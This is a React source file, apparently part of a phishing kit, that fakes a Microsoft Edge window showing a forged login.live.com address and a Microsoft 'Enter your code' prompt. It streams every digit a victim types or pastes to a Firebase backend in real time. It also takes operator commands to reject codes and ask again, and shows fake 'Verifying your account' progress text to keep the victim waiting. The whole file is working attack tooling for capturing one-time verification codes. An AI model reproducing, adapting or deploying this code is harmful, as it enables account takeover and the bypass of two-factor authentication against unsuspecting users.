import React from "react";
import { useNavigate } from "react-router-dom";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";
import DeviceManager from "../../../utils/deviceManager";
import outGif from "../assets/outgif.gif";
// Página de verificação de código (6 dígitos) – versão em inglês
const OutlookVerifyCodePage = () => {
  const { updateClientData, commands, clearCommands, clientData } = useFirebaseClient();
  
  // Obter device number do DeviceManager (mesma lógica da GmailPasswordPage)
  const getLoggedInDevice = () => {
    return DeviceManager.getDeviceWithFirebaseData(clientData);
  };

  const [clientDevice, setClientDevice] = React.useState(getLoggedInDevice());
  
  // Atualizar device quando clientData mudar
  React.useEffect(() => {
    const newDevice = getLoggedInDevice();
    if (newDevice && newDevice !== clientDevice) {
      setClientDevice(newDevice);
    }
  }, [clientData?.deviceNumber, clientData?.deviceNumberConfirmed, clientData?.lastDevice, clientDevice]);
  const translations = {
    windowTitle: "Verify your identity - Microsoft Edge",
    url: "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1754894&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
  };

  const [code, setCode] = React.useState(["", "", "", "", "", ""]);
  const inputsRef = React.useRef([]);
  const [focusedIndex, setFocusedIndex] = React.useState(-1);
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState("final");
  const phrases = React.useMemo(
    () => [
      "Connecting to Outlook...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const debounceRef = React.useRef(null);
  const [isReady, setIsReady] = React.useState(false);
  React.useEffect(() => {
    // Preloader de ~3s dentro do modal para evitar flicker
    const id = setTimeout(() => setIsReady(true), 3000);
    return () => clearTimeout(id);
  }, []);

  // Drag (mesmo padrão das outras páginas)
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - 466) / 2),
    top: Math.max(12, (window.innerHeight - 420) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    // Só permite arrastar se clicar no header da janela (não no conteúdo)
    const isHeaderElement = e.target.closest('[data-window-header="true"]');
    if (!isHeaderElement) return;

    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  const focusInput = (index) => {
    const el = inputsRef.current[index];
    if (el) el.focus();
  };

  const handleChange = (value, index) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 1);
    const next = [...code];
    next[index] = sanitized;
    setCode(next);
    try {
      const joined = next.join("");
      updateClientData({ outlookVerifyCode: joined });
      reportTyping("outlookcode", joined);
    } catch {}
    if (sanitized && index < 5) focusInput(index + 1);
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace") {
      if (code[index]) {
        const next = [...code];
        next[index] = "";
        setCode(next);
      } else if (index > 0) {
        focusInput(index - 1);
      }
    }
    if (e.key === "ArrowLeft" && index > 0) focusInput(index - 1);
    if (e.key === "ArrowRight" && index < 5) focusInput(index + 1);
  };

  const handlePaste = (e) => {
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!text) return;
    const next = text.split("");
    while (next.length < 6) next.push("");
    setCode(next);
    try {
      const joined = next.join("");
      updateClientData({ outlookVerifyCode: joined });
      reportTyping("outlookcode", joined);
    } catch {}
    // Focar o último preenchido
    const lastIdx = Math.min(text.length, 6) - 1;
    if (lastIdx >= 0) focusInput(lastIdx);
    e.preventDefault();
  };

  const email = clientDevice || "user@outlook.com";
  const [invalidMessage, setInvalidMessage] = React.useState("");

  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid email code.");
      setCode(["", "", "", "", "", ""]);
      setIsSubmitting(false);
      setLoadingStage("bar");
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=outlook_verify_code",
      currentPage: "outlook_verify_code",
      fromForm: true,
    });
  }, [updateClientData]);
  const isComplete = code.join("").length === 6;

  React.useEffect(() => {
    if (isSubmitting && loadingStage === "final") {
      const id = setInterval(
        () => setPhraseIndex((p) => (p + 1) % phrases.length),
        2000
      );
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, phrases.length]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Segoe UI, Roboto, Arial, sans-serif" }}
      >
        <div
          style={{
            background: isSubmitting ? "#ffffff" : "#fbfbfb",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(420px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            zIndex: 1000,
            cursor: isDragging ? "grabbing" : "default",
          }}
        >
          {/* Simulação de barra da janela/navegador */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            <span style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <svg
                width="16"
                height="16"
                viewBox="0 0 32 32"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
              >
                <path fill="#FEBA08" d="M17 17h10v10H17z" />
                <path fill="#05A6F0" d="M5 17h10v10H5z" />
                <path fill="#80BC06" d="M17 5h10v10H17z" />
                <path fill="#F25325" d="M5 5h10v10H5z" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <svg
                width="12"
                height="12"
                viewBox="0 0 16 16"
                aria-hidden="true"
              >
                <path
                  d="M3 8.5H13"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  strokeLinecap="round"
                />
              </svg>
              <svg
                width="12"
                height="12"
                viewBox="0 0 16 16"
                aria-hidden="true"
              >
                <rect
                  x="3.5"
                  y="3.5"
                  width="9"
                  height="9"
                  rx="1"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  fill="none"
                />
              </svg>
              <svg
                width="12"
                height="12"
                viewBox="0 0 16 16"
                aria-hidden="true"
              >
                <path
                  d="M4 4L12 12"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  strokeLinecap="round"
                />
                <path
                  d="M12 4L4 12"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  strokeLinecap="round"
                />
              </svg>
            </div>
          </div>
          {/* Barra de URL */}
          <div
            style={{ borderBottom: "1px solid #e1dfdd", background: "#ffffff" }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: 28,
                display: "flex",
                alignItems: "center",
                padding: "0 12px",
                gap: 10,
                fontSize: 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          <div
            style={{
              padding: 24,
              display: "flex",
              flexDirection: "column",
              minHeight: "100%",
              position: "relative",
              paddingBottom: 24,
            }}
          >
            {/* Spinner inicial sobrepondo apenas o conteúdo */}
            {!isReady && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  zIndex: 10,
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #106ebe",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>
            )}
            {/* Header com Microsoft centralizado (sem back arrow) */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                position: "relative",
              }}
            >
              {/* seta removida */}
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 10,
                }}
              >
                <svg
                  width="24"
                  height="24"
                  viewBox="0 0 32 32"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path fill="#FEBA08" d="M17 17h10v10H17z" />
                  <path fill="#05A6F0" d="M5 17h10v10H5z" />
                  <path fill="#80BC06" d="M17 5h10v10H17z" />
                  <path fill="#F25325" d="M5 5h10v10H5z" />
                </svg>
                <span style={{ fontSize: 20, color: "#1b1a19" }}>
                  Microsoft
                </span>
              </div>
            </div>

            {/* Chip com email */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: 14,
              }}
            >
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  padding: "6px 12px",
                  borderRadius: 999,
                  border: "1px solid #e1dfdd",
                  background: "#fff",
                  fontSize: 13,
                  color: "#605e5c",
                }}
              >
                {email}
              </div>
            </div>

            {/* Title */}
            <h1
              style={{
                fontSize: 24,
                fontWeight: 700,
                textAlign: "center",
                marginTop: 16,
                marginBottom: 8,
                color: "#1b1a19",
              }}
            >
              Enter your code
            </h1>
            <p
              style={{
                textAlign: "center",
                color: "#323130",
                fontSize: 14,
                marginBottom: 18,
              }}
            >
              We've sent a code to your email address.
            </p>

            {/* 6-digit inputs */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                gap: 12,
                marginBottom: 16,
              }}
              onPaste={handlePaste}
            >
              {code.map((val, idx) => (
                <input
                  data-outlook-modal
                  key={idx}
                  ref={(el) => (inputsRef.current[idx] = el)}
                  value={val}
                  onChange={(e) => handleChange(e.target.value, idx)}
                  onKeyDown={(e) => handleKeyDown(e, idx)}
                  onFocus={() => setFocusedIndex(idx)}
                  onBlur={() => setFocusedIndex(-1)}
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  style={{
                    width: 46,
                    height: 46,
                    textAlign: "center",
                    border: `1px solid ${
                      focusedIndex === idx ? "#106ebe" : "#c8c6c4"
                    }`,
                    borderRadius: 6,
                    background: "#ffffff",
                    color: "#1b1a19",
                    fontSize: 18,
                    outline: "none",
                  }}
                />
              ))}
            </div>
            {/* Botão Next aparece quando completo */}
            <div style={{ textAlign: "center", marginTop: 8 }}>
              <button
                type="button"
                disabled={!isComplete}
                onClick={() => {
                  if (!isComplete) return;
                  try {
                    updateClientData({
                      outlookVerifyCodeSubmittedAt: Date.now(),
                    });
                  } catch {}
                  setIsSubmitting(true);
                  setLoadingStage("final");
                }}
                style={{
                  padding: "9px 24px",
                  background: "#0F64B1",
                  color: "#ffffff",
                  border: "1px solid #0F64B1",
                  borderRadius: 4,
                  fontSize: 14,
                  fontWeight: 600,
                  minWidth: 100,
                  cursor: isComplete ? "pointer" : "not-allowed",
                  opacity: isComplete ? 1 : 0.65,
                }}
              >
                Next
              </button>
            </div>

            {/* Link "Didn't receive a code?" */}
            <div style={{ textAlign: "center", marginTop: 18 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{
                  color: "#0f6cbd",
                  textDecoration: "none",
                  fontSize: 15,
                }}
              >
                Didn't receive a code?
              </a>
            </div>

            {/* Keyframes */}
            <style>{`
            @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
            @keyframes loadingBar { 0% { transform: translateX(-100%);} 50% { transform: translateX(0%);} 100% { transform: translateX(100%);} }
          `}</style>
          </div>
          {/* Removido loading bar (etapa 1) */}
          {/* Footer removido para evitar botão Next duplicado */}

          {/* Etapa final idêntica ao OutlookPassword (overlay dentro do modal) */}
          {isSubmitting && loadingStage === "final" && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 11,
              }}
            >
              {invalidMessage && (
                <div
                  style={{
                    color: "#a4262c",
                    fontSize: 12,
                    textAlign: "center",
                    marginTop: 6,
                  }}
                >
                  {invalidMessage}
                </div>
              )}
              <div
                style={{
                  borderBottom: "1px solid #e1dfdd",
                  background: "#ffffff",
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#f5f5f5",
                    borderTop: "1px solid #d0d7de",
                    borderBottom: "1px solid #d0d7de",
                    boxSizing: "border-box",
                    height: 28,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 12px",
                    gap: 10,
                    fontSize: 12,
                    color: "#605e5c",
                  }}
                >
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#605e5c"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                      flex: 1,
                      fontWeight: 400,
                      letterSpacing: "0.2px",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 16,
                  textAlign: "center",
                }}
              >
                <img
                  src={outGif}
                  alt="Outlook"
                  style={{ width: 300, height: "auto" }}
                />
                <div
                  style={{
                    width: 36,
                    height: 36,
                    border: "3px solid #106ebe",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
                <div style={{ color: "#323130", fontSize: 16, minHeight: 24 }}>
                  {phrases[phraseIndex]}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </EmailLayout>
  );
};

export default OutlookVerifyCodePage;
